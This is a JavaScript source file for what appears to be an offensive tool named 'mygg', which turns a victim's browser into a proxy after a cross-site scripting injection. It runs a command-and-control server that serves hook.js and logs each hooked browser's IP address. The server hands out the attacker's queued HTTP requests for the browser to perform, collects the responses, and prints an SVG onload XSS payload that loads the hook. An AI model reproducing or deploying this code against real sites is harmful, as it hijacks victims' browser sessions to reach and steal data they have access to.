const https = require('https');
const http = require('http');
const fs = require('fs');

/* 
### Config.
*/

const config = {
    web_host: '127.0.0.1',
    web_port: 443,
    key: fs.readFileSync('server.key'),
    cert: fs.readFileSync('server.crt'),
    proxy_ip: '127.0.0.1',
    proxy_port: 8081,
    proxy_allowed_ips: ['127.0.0.1'],
}

/* 
task_pending test
var tasks_pending = [{"id": 1, "method": "GET", "url": "/secret.html", "head": {"Token": "key"}, "body": null},
                     {"id": 2, "method": "GET", "url": "/secret2.html", "head": {"Token": "key"}, "body": null},
                     {"id": 3, "method": "POST", "url": "/secret2.html", "head": {"Content-Type": "application/json"}, "body": '{"test":"asdf"}'},
                     {"id": 4, "method": "POST", "url": "/secret2.html", "head": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "test=asdf&qwer=123"},
                    ]
*/
var tasks_pending = []
/* 
task_completed test
var tasks_pending = [{"id": 1, "head": {"Token": "key"}, "body": null},
*/
var tasks_completed = [];


/* 
### The proxy server that communicates with mygg 
*/

const proxy_options = {
    key: config.key,
    cert: config.cert
};

var task_counter = 10;

http.createServer(function (req, res) {
    //console.log("Incomming request")
    //console.log(req.headers)
    //console.log(req.url)
    //console.log(req.body)

    /* Add new task */
    var id = task_counter;
    var new_task = {"id": task_counter++, "method": req.method, "url": req.url, "head": req.headers, "body": req.body}
    tasks_pending.push(new_task);
    console.log(tasks_pending)
    /* Waiting for the task to be polled and executed by the hooked browser */
    while (1) {
        tasks_completed.forEach(function(obj) {
            if (obj.id == id) {
                res.writeHead(200, obj.headers);
                res.end(obj.body);
            }
        });
    }   

}).listen(config.proxy_port, function (err) {
    if (err) {
        return console.error(err)
    }
    var info = this.address()
    console.log(`[+] mygg server is listening on address ${info.address} port ${info.port}`)
});


/* 
### The web server communicating with the hooked browser.
### Used to serve hook.js and receive/answering polling requests.
*/
const https_options = {
    key: config.key,
    cert: config.cert
};
https.createServer(https_options, function (req, res) {
    /* Serves the hook file */
    if (req.url == '/hook.js') {
        fs.readFile('./hook.js', function (err, data) {
            res.end(data);
        });
        var hooked_ipaddr = req.connection.remoteAddress.split(':')[3]
        var hooked_useragent = req.headers['user-agent']; 
        console.log("[+] Hooked new browser [" + hooked_ipaddr + "] [" + hooked_useragent + "]");
    /* Hooked browser asks mygg if there are any new jobs for it */
    } else if (req.url == '/polling') {
        res.setHeader('Access-Control-Allow-Origin', '*')
        res.setHeader('Access-Control-Allow-Headers', '*')
        res.setHeader('Content-Type', 'application/json')
        if (tasks_pending.length > 0) {
            data = JSON.stringify(tasks_pending);
            res.writeHead(200);
            res.end(data);
            tasks_pending = []
        } else {
            res.writeHead(404)
            res.end();
        }
    /* Catching the pre-flight request from the hooked browser */
    } else if (req.url == '/responses' && req.method == 'OPTIONS') {
        res.setHeader('Access-Control-Allow-Origin', '*')
        res.setHeader('Access-Control-Allow-Headers', 'Content-Type')
        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        res.writeHead(200);
        res.end();
    /* Catching the responses the hooked browser did on mygg's bidding */
    } else if (req.url == '/responses' && req.method == 'POST') {
        res.setHeader('Access-Control-Allow-Origin', '*')
        res.setHeader('Access-Control-Allow-Headers', 'Content-Type')
        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        res.setHeader('Content-Type', 'application/json')

        var body = ''
        req.on('data', function (chunk) {
            body += chunk;
        });
        req.on('end', function () {
            var result = JSON.parse(body)
            tasks_completed.push(result);
            res.writeHead(200);
            res.end();
        });

    } else {
        res.writeHead(404);
        res.end();
    }
}).listen(config.web_port, function (err) {
    if (err) {
        return console.error(err)
    }
    var info = this.address()
    console.log(`[+] mygg server is listening on address ${info.address} port ${info.port}`)
});

/* 
### The payload that downloads mygg 
*/
var hook = '<svg/onload="x=document.createElement(\'script\');'
var hook = hook + 'x.src="//' + config.web_host + '/hook.js";document.head.appendChild(x);">'
console.log("[+] Payload:\r\n" + hook + "\r\n")



//const proxy_server = http.createServer(proxy_options, function (req, res) {
    //res.writeHead(405, {'Content-Type': 'text/plain'})
    //res.end('Method not allowed')
    
//})

/*
proxy_server.on('connect', function (req, client_socket, head) {
    console.log(client_socket.remoteAddress, client_socket.remotePort, req.method, req.url, req.headers)
    client_socket.write([
      'HTTP/1.1 200 Connection Established',
      'Proxy-agent: Node-VPN',
    ].join('\r\n'))
    client_socket.end('\r\n\r\n')

    var buf = ''
    client_socket.on('data', function ( chunk ) {
        buf += chunk
    });

    client_socket.on('end', function () {
        console.log(buf)
        client_socket.end();
    });
});
*/

/*
const listener = proxy_server.listen(config.proxy_port, function (err) {
    if (err) {
      return console.error(err)
    }
    const info = listener.address()
    console.log(`[+] Proxy server is listening on address ${info.address} port ${info.port}`)
})
  */  


